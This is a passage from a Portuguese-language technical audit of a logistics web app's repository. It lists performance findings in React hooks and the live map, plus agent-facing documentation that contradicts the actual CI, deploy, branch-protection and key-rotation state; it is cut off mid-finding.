- **Causa raiz:** Cada mudança em qualquer linha de `active_tracking` dispara releitura completa da tabela com dois joins, sem agrupamento nem espera; como o rastreamento grava posição continuamente, N pings geram N varreduras completas — e o setInterval de 5 s faz a mesma varredura de qualquer forma. O payload do evento (`payload.new`) é descartado em vez de atualizar só a linha alterada.
- **Arquivos:** `src/components/map/hooks/useTrackingData.ts`
- **Etapas do plano:** 178

#### M-107 — useSLAMetrics recria o canal realtime a cada render (handleUpdate depende do objeto da query)

- **Camada:** Hooks e estado — dados de negócio
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O painel de SLA fica abrindo e fechando a conexão de tempo real continuamente; em pico de movimento perde eventos e consome conexão e banda à toa.
- **Evidência:**
  ```
  src/hooks/useSLAMetrics.ts:188-200 (`refetchInterval: 10000` em :191; `useCallback(..., [query])` em :196-199; `useSLAMetricsRealtime(handleUpdate);` em :200); src/hooks/useRealtimeSubscriptions.ts:412 `.channel('sla-metrics-consolidated')`, :429 `supabase.removeChannel(channel);`, :431 `}, [onUpdate]);`; node_modules/@tanstack/query-core/build/modern/queryObserver.js:174-180 (proxy novo por render); src/pages/SLADashboardPage.tsx:48
  ```
- **Causa raiz:** `query` (retorno de useQuery) é objeto novo a cada render; com `refetchInterval: 10000` (useSLAMetrics.ts:191) o hook renderiza pelo menos a cada 10 s, e cada render troca `handleUpdate`, disparando cleanup + nova assinatura de 'sla-metrics-consolidated' (useRealtimeSubscriptions.ts:412-430). Pior: cada evento realtime chama refetch, que renderiza, que recria o canal — realimentação.
- **Arquivos:** `src/hooks/useSLAMetrics.ts`, `src/hooks/useRealtimeSubscriptions.ts`
- **Etapas do plano:** 223

#### M-111 — Cada troca de estilo ou de provedor recria o mapa Mapbox e cobra um novo map load, além de refazer as chamadas de Directions

- **Camada:** Interface — mapa e rastreamento
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Um operador que alterna entre mapa escuro e satélite algumas vezes por hora multiplica a fatura de mapa e de cálculo de rota sem gerar nenhuma informação nova.
- **Evidência:**
  ```
  src/components/map/LiveMap.tsx:144 `map.current = new mapboxgl.Map({`; :152 `countMapLoad('mapbox');`; :208 `}, [mapboxToken, initialCenter, initialZoom, showControls, mapStyle, resetMarkers, isGoogleActive]);`; src/components/map/hooks/useMapMarkers.ts:120 `routeLines.current.clear();`; useMapMarkers.ts:278 `getDirections(waypoints, 'driving-traffic')`
  ```
- **Causa raiz:** `mapStyle` e `isGoogleActive` estão nas dependências do efeito que instancia o mapa, então clicar nos botões de estilo (LiveMap.tsx:471 `onClick={() => setMapStyle('dark-v11')}` / 481 satélite) ou alternar provedor destrói a instância e cria outra, contabilizando um map load novo a cada clique. Em cascata, `resetMarkers` (useMapMarkers.ts:112-121) limpa o Set `routeLines`, e os pedidos sem `expected_route` voltam a chamar Directions no browser um por um (useMapMarkers.ts:278 `getDirections(waypoints, 'driving-traffic')` → src/hooks/useMapbox.ts:487-493 → geo-gateway), sem cache.
- **Arquivos:** `src/components/map/LiveMap.tsx`, `src/components/map/hooks/useMapMarkers.ts`, `src/hooks/useMapbox.ts`
- **Etapas do plano:** 227

#### M-112 — Loop de animação a 60 fps roda sem parar no mapa ao vivo, inclusive sem movimento e com provedor Google ativo

- **Camada:** Interface — mapa e rastreamento
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A aba do mapa consome processador e bateria o tempo todo; em máquina mais fraca ou notebook em bateria a tela fica lenta e esquenta sem estar fazendo nada.
- **Evidência:**
  ```
  src/components/map/hooks/useMapMarkers.ts:142-146 `animationFrameRef.current = requestAnimationFrame(animate);` / `};` / `animationFrameRef.current = requestAnimationFrame(animate);` / `return () => {` / `  if (animationFrameRef.current) cancelAnimationFrame(animationFrameRef.current);` com deps `}, [mapRef]);`
  ```
- **Causa raiz:** O efeito agenda `requestAnimationFrame` em cadeia com deps `[mapRef]` (ref estável), então o loop vive durante toda a permanência na tela. A interpolação usa fator fixo de 5% por frame, que se aproxima do destino mas nunca o alcança, de modo que `setLngLat` é chamado para todo motorista em todo frame — repintura contínua do mapa mesmo quando ninguém se moveu. O hook é chamado incondicionalmente pelo LiveMap (LiveMap.tsx:109-123), inclusive quando o provedor é Google e o mapa Mapbox nem existe.
- **Arquivos:** `src/components/map/hooks/useMapMarkers.ts`, `src/components/map/LiveMap.tsx`
- **Etapas do plano:** 228

#### M-113 — Mesma tabela active_tracking consultada por 2 a 3 pollings simultâneos e 2 canais realtime, e o kill-switch documentado não desliga o polling

- **Camada:** Interface — mapa e rastreamento
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A tela de rastreamento consulta o banco várias vezes por segundo quando os motoristas estão se movendo — custo de banco e de tráfego multiplicado por 2 ou 3 sem nenhum ganho, e risco de a tela engasgar justamente na hora de maior movimento.
- **Evidência:**
  ```
  src/pages/LiveMapPage.tsx:147 `const interval = setInterval(fetchDeliveries, 10000);` e :160-176 `.channel('live-map-tracking')` ... `() => { fetchDeliveries(); }` · src/components/map/hooks/useTrackingData.ts:88-98 `.channel('active-tracking-changes')` / `() => { fetchTrackingData(); }` / `.subscribe();` / `const interval = setInterval(fetchTrackingData, 5000);` · src/components/map/GoogleMapsCanvas.tsx:102 e Google3DCanvas.tsx:38 `const { trackingData } = useTrackingData(vehicleFilter, statusFilter);`
  ```
- **Causa raiz:** A página e o componente de mapa fazem fetch independentes da mesma tabela com os mesmos joins, cada um com seu intervalo e seu canal realtime no evento '*'. Quando o provedor ativo é Google, há ainda um terceiro consumidor do hook (src/components/map/GoogleMapsCanvas.tsx:102 `const { trackingData } = useTrackingData(vehicleFilter, statusFilter);`, idem Google3DCanvas.tsx:38), abrindo um segundo canal com o mesmo nome 'active-tracking-changes'. Cada evento de posição dispara um refetch completo em cada consumidor, sem debounce. Além disso o comentário de LiveMapPage.tsx:71-73 e o doc docs/pendencias/P-16-hooks-orfaos-triagem.md:14 dizem que com a flag `realtime_map_updates` desligada o mapa 'cai para polling de 10s em vez de abrir canal Realtime' — mas o `setInterval` da linha 147 é incondicional: com a flag ligada rodam polling E realtime.
- **Arquivos:** `src/pages/LiveMapPage.tsx`, `src/components/map/hooks/useTrackingData.ts`, `src/components/map/GoogleMapsCanvas.tsx`, `src/components/map/Google3DCanvas.tsx`, `docs/pendencias/P-16-hooks-orfaos-triagem.md`
- **Etapas do plano:** 229

#### B-013 — Opções 'Grátis' do seletor usam tiles públicos de OSM e Esri direto do servidor de origem

- **Camada:** Interface — mapa e rastreamento
- **Severidade:** Baixa · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Essas duas opções podem parar de carregar de um dia para o outro por limite do fornecedor gratuito, deixando o operador com o mapa em branco — e são anunciadas na interface como alternativa 'Grátis' confiável.
- **Evidência:**
  ```
  src/components/map/mapLayers.ts:267-269 `'https://a.tile.openstreetmap.org/{z}/{x}/{y}.png',` ... e :276 `'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}',` + src/components/map/MapProviderSelector.tsx:28 `{ id: 'osm', label: 'OpenStreetMap', icon: MapIcon, hint: 'Grátis' },`
  ```
- **Causa raiz:** O overlay raster aponta para os servidores públicos de tiles do OpenStreetMap e do ArcGIS Online, sem proxy, sem cache e sem chave — uso que as políticas desses serviços restringem para aplicação comercial e que pode ser limitado ou bloqueado por volume/por referer. Não há nenhum tratamento de falha de tile: se o servidor recusar, o mapa fica cinza (a camada é adicionada em mapLayers.ts:297-318 sem handler de erro).
- **Arquivos:** `src/components/map/mapLayers.ts`, `src/components/map/MapProviderSelector.tsx`
- **Etapas do plano:** 168
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Medir o volume real de tiles por sessão e verificar se há bloqueio/throttle em produção (precisa de acesso a log de rede do ambiente publicado); a política de uso de cada fornecedor também deve ser confirmada pelo dono antes de tratar como impedimento.


## Causa raiz: Documentos de instrução e backlog congelados em 8 de novembro, descrevendo um repositório que já mudou

Os documentos que orientam qualquer agente de IA (e o dono) foram escritos numa leitura de 8 de novembro e nunca reconciliados depois. Eles negam a existência de automações que existem, dão a publicação como manual quando ela é automática, afirmam que a branch principal não tem travas quando ela tem sete verificações obrigatórias, erram as contagens de inventário em cadeia (153 migrations contra 191 reais), apontam uma função que já foi removida e, no caso das pendências, listam como "aguardando decisão do dono" três coisas que já foram concluídas. Documentos técnicos (contratos, rotinas agendadas, dicionário de dados) repetem o mesmo padrão. Quem obedece a esses documentos trabalha com o mapa errado.

**21 achado(s) sob esta causa.**


#### A-006 — P-04 e P-10 afirmam que as chaves legacy foram rotacionadas e estao 401; banco.md diz o oposto e e a fonte mais recente

- **Camada:** Documentação × código
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O dono e qualquer agente que abrir a pasta de pendencias conclui que o vazamento de chave de 08/11 esta neutralizado. Se banco.md estiver certo, a chave com privilegio total sobre o banco de producao continua valida e publicada no historico do git — o unico item de seguranca realmente aberto fica marcado como "nenhum impacto".
- **Evidência:**
  ```
  docs/pendencias/P-04-rotacionar-jwt-secret-painel.md:7 "As chaves anon/service_role legacy foram desabilitadas (401) na rotação de 2026-11-20 17:25Z."; docs/pendencias/P-10-scripts-chaves-legacy.md:8 "~12 scripts de diagnóstico restantes ainda têm chaves legacy hardcoded (anon ... e service_role ... — todas 401 após rotação)" e :15 "- Nenhum — chaves já desabilitadas; código de diagnóstico inerte." — contra docs/agentes/banco.md:97-98 "**Tratar como NÃO VERIFICADO que a chave vazada em 08/11 tenha sido invalidada — ela muito provavelmente continua válida hoje.**" (as linhas citadas pelo auditor como P-10:12 e P-10:19 sao, no arquivo atual, :8 e :15)
  ```
- **Causa raiz:** banco.md foi corrigido em 2026-11-22 com evidencia nova (o JWT ativo tem `iat` igual ao `created_at` do projeto, 2026-08-02 — logo e a chave original, nao uma chave nova), mas os arquivos de pendencia que repetem a premissa antiga nao foram atualizados. Alem disso P-10 descreve ~12 scripts com chave hardcoded que nao existem mais: a varredura desta auditoria em scripts/ nao achou nenhum segredo real (os unicos matches sao o padrao do detector em scripts/pre-commit-secrets.sh:33 e uma fixture de teste em scripts/ai-context/cenarios.mjs:133).
- **Arquivos:** `docs/pendencias/P-04-rotacionar-jwt-secret-painel.md`, `docs/pendencias/P-10-scripts-chaves-legacy.md`, `docs/agentes/banco.md`, `docs/pendencias/_ordem.md`
- **Etapas do plano:** 021

#### A-024 — banco.md ensina que "o merge e o apply" de migration e nega a existencia de workflow de migration; existe .github/workflows/apply-migrations.yml, manual

- **Camada:** Documentação × código
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Mudanca de banco mergeada e anunciada como "em producao" sem nunca ter sido aplicada: a tela nova quebra em producao porque a tabela/coluna nao existe, e ninguem sabe que faltou um passo. O inverso tambem: um agente que acredita que "o merge e o apply" evita abrir PR por medo de aplicar DDL sem autorizacao, travando trabalho que era seguro.
- **Evidência:**
  ```
  docs/agentes/banco.md:50-54 vs. .github/workflows/apply-migrations.yml:1,3-7,9-19 (workflow_dispatch com inputs files/dry_run, sem push); `ls .github/workflows/` = 5 arquivos; mencao real ao fluxo em docs/agentes/pendencias-dono.md:13
  ```
- **Causa raiz:** O workflow de apply foi criado depois de banco.md e o doc nunca foi corrigido. Hoje o apply e um workflow_dispatch que alguem precisa disparar com a lista de arquivos; merge em main nao aplica nada. O proprio docs/agentes/pendencias-dono.md:60 ja fala de "o proximo apply-migrations", provando que o fluxo real e outro.
- **Arquivos:** `docs/agentes/banco.md`, `.github/workflows/apply-migrations.yml`, `docs/agentes/pendencias-dono.md`, `docs/DEPLOYMENT.md`
- **Etapas do plano:** 062

#### A-025 — deploy.md afirma que nao existe automacao de deploy de edge function; .github/workflows/deploy-edges.yml faz exatamente isso em push para main

- **Camada:** Documentação × código
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Dois riscos opostos. O agente que confia no doc mexe em edge function acreditando que nada sobe sozinho e publica codigo na producao sem perceber. E o agente que precisa publicar uma edge vai pedir passo manual ao dono, que o AGENTS.md proibe, em vez de simplesmente mergear.
- **Evidência:**
  ```
  docs/agentes/deploy.md:41-45 vs. .github/workflows/deploy-edges.yml:1,11-18 (push em main filtrado por paths),:28-37 (PROJECT_REF iecgydonctmabiijadsf, setup-cli 3.2.0),:38-45 (deploy de todas as functions)
  ```
- **Causa raiz:** deploy.md foi escrito em 2026-11-08 ("Tudo abaixo foi lido em 2026-11-08"), antes do deploy-edges.yml existir, e nunca foi revisitado. A consequencia que o doc tira ("Merge em `main` não garante edge nova em produção") inverteu de sinal: hoje o merge em main que toque supabase/functions/** dispara deploy real na producao.
- **Arquivos:** `docs/agentes/deploy.md`, `.github/workflows/deploy-edges.yml`, `supabase/config.toml`
- **Etapas do plano:** 063

#### A-026 — docs/DEPLOYMENT.md e README.md descrevem a producao na Lovable, e banco.md usa o DEPLOYMENT.md como fonte do fluxo de migration

- **Camada:** Documentação × código
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O agente segue a cadeia AGENTS.md -> banco.md -> DEPLOYMENT.md e aprende um fluxo que nao existe: "git push e a Lovable aplica as migrations". Resultado: mudanca de banco mergeada e declarada pronta sem aplicacao, e verificacao de deploy feita contra uma URL que nao serve o produto (nem o /health existe).
- **Evidência:**
  ```
  docs/agentes/banco.md:51-54 "**Caminho documentado hoje:** arquivo em `supabase/migrations/` → push/merge em `main` → a Lovable sincroniza e aplica (`docs/DEPLOYMENT.md` > Deploy Process / Migrations). Não há workflow de migration no repo (`.github/workflows/ci.yml` é o único arquivo ...). Logo: **o merge é o apply**" — contra .github/workflows/apply-migrations.yml:1-10 "name: Apply Migrations (manual)" ... "on: workflow_dispatch"; mais docs/DEPLOYMENT.md:12-14, :26-29, :33, :43 e README.md:1426 como citado.
  ```
- **Causa raiz:** O repo migrou de Lovable para Vercel e os dois documentos de entrada (README e DEPLOYMENT) nunca foram retificados. Tres docs de agente ja reconhecem a defasagem (mapa-repo.md:22, deploy.md:33-37, deploy.md:74), mas nenhum deles corta o elo: banco.md continua apontando para o DEPLOYMENT.md como autoridade do fluxo de DDL, que e exatamente a parte errada do doc.
- **Arquivos:** `docs/DEPLOYMENT.md`, `README.md`, `docs/agentes/banco.md`, `docs/agentes/deploy.md`
- **Etapas do plano:** 064

#### M-021 — Contagens de inventario erradas e em cadeia nos docs de agentes: 153/157 migrations contra 191 reais, 4 specs e2e contra 7, 6 rotas com MFA contra 7

- **Camada:** Documentação × código
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O agente usa esses numeros para decidir se o repo bate com o que ele esta vendo. Divergencia de 38 migrations faz ele concluir que o checkout esta incompleto ou que alguem apagou arquivos, e a lista incompleta de rotas com MFA faz tela sensivel nova nascer sem exigir segundo fator — o `/settings/maps` ja nao aparece no doc.
- **Evidência:**
  ```
  191 migrations (20241231000000_saved_filters.sql … 20261124120000_internal_alert_channels.sql) contra docs/agentes/banco.md:34, docs/agentes/mapa-repo.md:41 e :62 (153) e docs/pendencias/_linha-de-base.md:19 (157); 7 rotas com requireMFA em src/App.tsx:195,197,198,199,200,201,208 contra docs/agentes/regras-dominio.md:15 ("seis", sem /settings/maps); 7 specs em e2e/*.e2e.ts contra regras-dominio.md:23-24 ("os quatro specs"); inventario/estado/edges.json gerado_em 2026-11-08 com total 26 contra 27 pastas em supabase/functions/.
  ```
- **Causa raiz:** Os numeros foram escritos a mao em 2026-11-08 e viraram texto fixo em quatro arquivos diferentes. Nenhum guard de CI confere contagem (scripts/ci/check-agents-md-integrity.mjs so verifica secoes obrigatorias e tamanho, nao conteudo), e o inventario automatico que existiria para isso (inventario/estado/*.json, gerado_em 2026-11-08) tambem esta velho: 54 rotas e 26 edges contra 56 e 27 reais.
- **Arquivos:** `docs/agentes/banco.md`, `docs/agentes/mapa-repo.md`, `docs/agentes/regras-dominio.md`, `docs/pendencias/_linha-de-base.md`, `inventario/estado/rotas.json`, `inventario/estado/edges.json`
- **Etapas do plano:** 100

#### M-022 — O indice do backlog (docs/pendencias/README.md) nao lista P-14, P-15 e P-16 — inclusive o unico item ativo da fila

- **Camada:** Documentação × código
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Quem abre a pasta de pendencias pelo indice ve 13 itens e conclui que o unico aberto e documentacao de schema. O item que de fato esta travado e mexe em dinheiro e operacao — o pipeline de escalonamento de alerta que nunca escalou nada em 2016 execucoes — simplesmente nao aparece.
- **Evidência:**
  ```
  docs/pendencias/README.md (tabela "## Itens", ultima linha = P-13 ABERTO) vs docs/pendencias/_ordem.md ("## Fila atual" item 2 = P-15; "## Itens concluídos" = P-13 via PR #103/a614869 e P-14; bloco de P-16 com PR #125/53b286b)
  ```
- **Causa raiz:** O README e o indice mantido a mao e tres itens nasceram depois sem entrar na tabela; o status de P-13 foi atualizado em _ordem.md e nao no README. Os dois arquivos sao a mesma fonte para quem chega na pasta e discordam entre si.
- **Arquivos:** `docs/pendencias/README.md`, `docs/pendencias/_ordem.md`, `docs/pendencias/P-14-analise-correcoes-planejadas.md`, `docs/pendencias/P-15-pipeline-escalonamento-alertas.md`, `docs/pendencias/P-16-hooks-orfaos-triagem.md`
- **Etapas do plano:** 101

#### M-023 — O procedimento de confirmacao de deploy documentado em deploy.md nao funciona com o acesso desta sessao, e o doc da a CI/build como quebrada enquanto o AGENTS.md a da como verde

- **Camada:** Documentação × código
- **Severidade:** Média · **Confiança:** hipotese · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O agente conclui que nada chega a producao e passa a responder ao dono que o sistema esta congelado desde setembro, ou gasta a sessao tentando um comando que sempre devolve 404. No sentido inverso, se a CI realmente esta verde, ele deixa de bloquear merge quando um check vermelho aparece, por acreditar que vermelho e o normal herdado.
- **Evidência:**
  ```
  docs/agentes/deploy.md (tabela "## Front", linha "Builds depois disso" + item 3 de "Pendências de Vercel"), docs/agentes/github-ci.md (bloco apos a tabela de jobs: "O CI está vermelho na `main` desde 2026-10-03" e "'CI verde' não existe neste repo hoje"), AGENTS.md secao "Fluxo Git"
  ```
- **Causa raiz:** Os dois docs de agente congelaram o estado de 08/11 e o AGENTS.md foi atualizado em 21/11 sem propagar para eles. Alem disso o unico procedimento de verificacao que deploy.md oferece depende de um escopo de token que a sessao nao tem — o proprio doc ja registra 403/404 em list_deployments e get_project com teamId, mas mesmo assim indica get_deployment por hostname como caminho bom.
- **Arquivos:** `docs/agentes/deploy.md`, `docs/agentes/github-ci.md`, `AGENTS.md`
- **Etapas do plano:** 102
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Qual das duas afirmacoes sobre CI/build e a verdadeira: falta ler os runs recentes da main no GitHub Actions e o estado do alias de producao no painel Vercel (o token desta sessao devolve 404 para o hostname e 403 para list_deployments, exatamente o limite que deploy.md:20-26 ja registra).

#### M-024 — github-ci.md declara a main sem branch protection e sem required checks; a API mostra 7 required checks e enforce_admins ligado

- **Camada:** Documentação × código
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** O agente le o manual e acredita que nada impede escrever direto na branca principal e que pode mergear com teste vermelho. Na pratica o merge e recusado e ele perde a sessao tentando, ou pior: tenta contornar a protecao por achar que ela nao existe.
- **Evidência:**
  ```
  docs/agentes/github-ci.md:33,35,50-51 vs. GET /repos/adm01-debug/Lalamove_V2/branches/main/protection lido em 23/11/2026: 7 contexts obrigatorios, enforce_admins.enabled=true, allow_force_pushes=false, allow_deletions=false
  ```
- **Causa raiz:** A tabela "estado canônico" de github-ci.md foi lida em 2026-11-08 e nunca foi reconciliada depois que a branch protection foi criada. O AGENTS.md ja registra o estado novo ("A `main` tem branch protection com 7 required checks ... o merge é recusado com HTTP 405"), mas github-ci.md — que o proprio AGENTS.md manda ler para detalhe — continua afirmando o contrario, e a regra escrita no doc ("qualquer mudança nos campos abaixo atualiza esta tabela no mesmo PR") foi violada.
- **Arquivos:** `docs/agentes/github-ci.md`, `AGENTS.md`
- **Etapas do plano:** 103

#### M-025 — github-ci.md descreve 1 workflow e 8 jobs e afirma que os guards nao estao ligados ao CI; sao 5 workflows, 13 jobs e o guard e required check

- **Camada:** Documentação × código
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** O agente que quer ligar um guard vai abrir PR e chamar o dono para algo que ja esta ligado — sessao gasta a zero. E quem le a tabela de jobs nao sabe que existem jobs de SQL geo e um guard bloqueante, entao nao roda o equivalente local e descobre a falha depois do push, quando a protecao da main recusa o merge.
- **Evidência:**
  ```
  docs/agentes/github-ci.md:57,60-69,68,114-115 vs. `ls .github/workflows/` = 5 arquivos e .github/workflows/ci.yml com 12 jobs: :80-81 guard-agents-md / 'Guarda AGENTS.md / docs/agentes' (required check), :97 node --test scripts/ci/*.unit.mjs, :108 npm audit --audit-level=critical, :157-158, :209-210, :241-242
  ```
- **Causa raiz:** Mesma defasagem de 2026-11-08. O ci.yml ganhou 5 jobs novos (guard-agents-md, sql-geo-tests, geo-sql-tests, geo-trigger-sql-tests) e o repo ganhou 4 workflows; a tabela de jobs e a frase final do doc nao acompanharam. O nivel do npm audit tambem mudou de high para critical.
- **Arquivos:** `docs/agentes/github-ci.md`, `.github/workflows/ci.yml`, `.github/workflows/contexto.yml`, `.github/workflows/inventario-estado-semanal.yml`, `.github/workflows/apply-migrations.yml`, `.github/workflows/deploy-edges.yml`
- **Etapas do plano:** 104

#### M-035 — github-settings-baseline.json afirma que a main nao tem branch protection, e a API diz o contrario — varios workflows repetem a informacao errada

- **Camada:** Infra, CI e deploy
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A documentacao interna de seguranca do repositorio esta errada sobre a propria trava que protege a producao; quem confiar nela toma decisao de merge baseada em premissa falsa.
- **Evidência:**
  ```
  scripts/ci/github-settings-baseline.json:22-24 `"branch_main": {` / `"protected": false` / `},`; :37-39 bloco `nao_verificavel_automaticamente` com "GET /branches/main responde protected=false, ou seja, main NAO tem branch protection". API hoje: /branches/main → `"protected": true`; /branches/main/protection → 7 contexts, enforce_admins.enabled=true. Propagacao em .github/workflows/contexto.yml:22, .github/workflows/inventario-estado-semanal.yml:20 e scripts/ci/README.md:89.
  ```
- **Causa raiz:** O baseline foi medido em 08/11/2026 com um token sem `administration:read` (o proprio arquivo registra o 403) e nunca foi refeito depois que a protecao entrou. Ele e a fonte que o github-settings-guard.mjs compara contra a realidade: do jeito que esta, qualquer execucao acusa divergencia ("mudanca fora de PR") num perimetro que na verdade ficou mais seguro — e, pior, agentes que leem o arquivo e os comentarios dos workflows concluem que podem empurrar codigo sem check.
- **Arquivos:** `scripts/ci/github-settings-baseline.json`, `.github/workflows/contexto.yml`, `.github/workflows/inventario-estado-semanal.yml`, `scripts/ci/README.md`
- **Etapas do plano:** 114

#### M-063 — AGENTS.md indica a edge mapbox-proxy como o proxy do Mapbox; ela foi removida do repo na etapa 61

- **Camada:** Documentação × código
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Agente encarregado de mexer em mapa procura uma funcao que nao existe, ou pior, recria/declara `mapbox-proxy` no config.toml — e, conforme o aviso no proprio config.toml, declarar funcao sem diretorio derruba o deploy de todas as edges de uma vez.
- **Evidência:**
  ```
  AGENTS.md:107 vs supabase/config.toml:93-97 (remocao na etapa 61 + aviso de que o bloco nao pode existir) e supabase/functions/geo-gateway/providers/mapbox.ts:1
  ```
- **Causa raiz:** A edge foi apagada do repo e o AGENTS.md, que e o doc de maior autoridade, nao foi atualizado. O codigo ja esta certo: so restam comentarios historicos em useMapbox.ts:57 e useGeoSearch.ts:6.
- **Arquivos:** `AGENTS.md`, `supabase/config.toml`, `src/hooks/useMapbox.ts`, `supabase/functions/geo-gateway/providers/mapbox.ts`
- **Etapas do plano:** 145

#### M-064 — pendencias-dono.md apresenta 3 PRs como abertas aguardando decisao do dono; as 3 estao mergeadas na main

- **Camada:** Documentação × código
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O dono abre a fila de decisoes e ve tres decisoes pendentes que nao existem mais, incluindo duas que envolvem mudanca de banco. Pior: um agente pode tentar "ajudar" reaplicando o rename de migration ou reabrindo PR equivalente, criando conflito em cima de trabalho que ja esta na main.
- **Evidência:**
  ```
  docs/agentes/pendencias-dono.md:7-15 (não :54-62): seção "PRs abertas aguardando decisão" com #226 (:11), #267 (:12), #268 (:13) e a frase "Todas as três ... prontas para merge" (:15). Seção que segue aberta: :17-24. Merges: d7c05dd (#226), 83125d1 (#267), ea8f382 (#268).
  ```
- **Causa raiz:** A lista de pendencias do dono e mantida a mao ("Ao decidir uma, apague a linha daqui") e as tres PRs foram mergeadas sem que a linha fosse apagada. O item #268 em particular ja nao tem sentido: a colisao de versao foi desfeita — `ls supabase/migrations | grep 1900` mostra 190000, 190001 e 190002, cada um unico.
- **Arquivos:** `docs/agentes/pendencias-dono.md`
- **Etapas do plano:** 146

#### M-136 — A linha de base anti-regressao, que as regras da pasta mandam rodar antes e depois de cada fatia, esta desatualizada e se contradiz com _ordem.md

- **Camada:** Documentação × código
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O protocolo que deveria garantir que "nada que funciona pode quebrar" compara o sistema contra um retrato errado. Um agente que rodar a baseline vai ver divergencia em tudo e nao consegue distinguir regressao que ele causou de defasagem do documento — ou seja, a rede de seguranca do backlog nao pega nada.
- **Evidência:**
  ```
  docs/pendencias/_linha-de-base.md linha 3 ("Gerado em 2026-11-26"), secao "## Inventário do sistema" (157 migrations / 83 hooks — real 191 e 88) e secao "## Itens NÃO VERIFICADOS" (itens 1 e 3 ja resolvidos por P-05 e P-06 em _ordem.md)
  ```
- **Causa raiz:** A baseline foi escrita numa sessao de 20/11 com carimbo de data errado e nunca reexecutada, apesar de a propria regra da pasta exigir que ela seja o parametro de antes/depois. Os itens "NAO VERIFICADOS" dela foram resolvidos depois (P-05, P-06) sem voltar ao arquivo.
- **Arquivos:** `docs/pendencias/_linha-de-base.md`, `docs/pendencias/_ordem.md`, `docs/pendencias/README.md`, `docs/pendencias/P-10-scripts-chaves-legacy.md`
- **Etapas do plano:** 272

#### M-137 — P-15 e P-16 registram a PR #119 como aberta e a main sem o trabalho dela; migration e tela ja estao na main

- **Camada:** Documentação × código
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O item que a fila aponta como prioridade 2 parece exigir revisao e merge de uma PR; na verdade so falta aplicar a migration no banco. O dono decide no escuro, e um agente pode reabrir/recriar a PR e duplicar migration — o repo ja teve colisao de versao exatamente assim (PR #268).
- **Evidência:**
  ```
  docs/pendencias/P-15-pipeline-escalonamento-alertas.md:3, docs/pendencias/_ordem.md:10, docs/pendencias/P-16-hooks-orfaos-triagem.md:20 — contra 0047f99 (migration 20261121193000_fix_escalation_pipeline.sql na main), src/pages/AlertConfigurationsPage.tsx:3,56 e src/pages/alert-configurations/AlertConfigCard.tsx:96-97 (os três hooks wireados), último commit da tela 1e2d9ce (#256).
  ```
- **Causa raiz:** O trabalho da PR #119 foi recuperado por outras PRs (#126 para a migration, #256 para a tela) e os arquivos de pendencia continuaram descrevendo o estado anterior. O que sobrou de aberto e so o apply da migration em producao, que e outra coisa do que "PR aberta".
- **Arquivos:** `docs/pendencias/P-15-pipeline-escalonamento-alertas.md`, `docs/pendencias/_ordem.md`, `docs/pendencias/P-16-hooks-orfaos-triagem.md`
- **Etapas do plano:** 273

#### B-005 — Três crons de cache documentados como ativos vêm de migration que nunca rodou, e dois apontam para materialized views que não existem em lugar nenhum

- **Camada:** Banco — funções, triggers e cron
- **Severidade:** Baixa · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O dono lê no documento de operação que quatro rotinas de cache estão rodando quando, na prática, só uma atualiza as telas; e se os jobs antigos existirem, enchem o histórico de execuções com erro sem ninguém notar.
- **Evidência:**
  ```
